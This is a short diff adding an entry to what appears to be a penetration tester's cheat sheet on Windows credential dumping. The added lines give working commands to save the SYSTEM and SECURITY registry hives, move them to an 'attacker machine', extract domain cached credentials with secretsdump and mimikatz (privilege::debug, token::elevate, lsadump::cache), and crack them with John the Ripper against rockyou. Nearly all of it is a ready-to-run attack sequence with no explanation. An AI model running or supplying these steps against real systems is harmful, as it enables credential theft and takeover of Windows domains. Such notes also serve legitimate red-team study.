@@ -239,6 +239,21 @@ impacket-secretsdump -sam SAM -system SYSTEM local
 ##
 https://juggernaut-sec.com/dumping-credentials-sam-file-hashes/
 
+----------------------------------------------
+#Exploiting domain cache credentials
+reg save hklm\system c:\system
+reg save hklm\security c:\secuirty
+
+#transfer file to attacker machine and secretsdumps
+python secretsdump.py -security -system system LOCAL
+
+#mimikatz
+privilege::debug
+token::elevate
+lsadump::cache
+
+john --format=mscash2 --wordlist=/usr/share/wordlists/rockyou.txt mhash
+
 ```
 
 
